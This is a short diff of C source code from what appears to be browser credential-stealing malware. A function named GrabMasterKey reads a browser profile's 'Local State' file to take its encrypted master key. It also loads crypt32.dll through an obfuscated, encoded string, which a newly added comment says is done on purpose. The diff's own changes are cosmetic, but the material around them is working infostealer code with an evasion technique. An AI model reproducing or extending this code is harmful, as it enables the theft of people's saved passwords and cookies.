@@ -32,7 +32,7 @@ void GrabMasterKey(unsigned short *path) {
     int                 FileSize             = 0;
     int                 TotalBufferSize      = 0;
     int                 PathSize             = lenW(path);
-    int i = 0, j = 0, k = 0;
+    int                 i = 0, j = 0, k = 0;
 
     MovMemory(path, TempPath, PathSize * 2);
     ConcatStringW(TempPath, L"\\Local State", PathSize);
@@ -85,6 +85,7 @@ void GrabMasterKey(unsigned short *path) {
     CryptedVaultKey.cbData = DecodedLength;
     CryptedVaultKey.pbData = DecodedString;
 
+    /*the passed argument is just crypt32.dll encoded*/
     Crypt32Dll = LoadDll((unsigned short[12]){0x0068, 0x00d0, 0x008d, 0x00d5, 0x007f, 0x009c, 0x0068, 0x0032, 0x008e, 0x00a6, 0x009e, 0x0000});
     if (Crypt32Dll == NULL) {
         return;
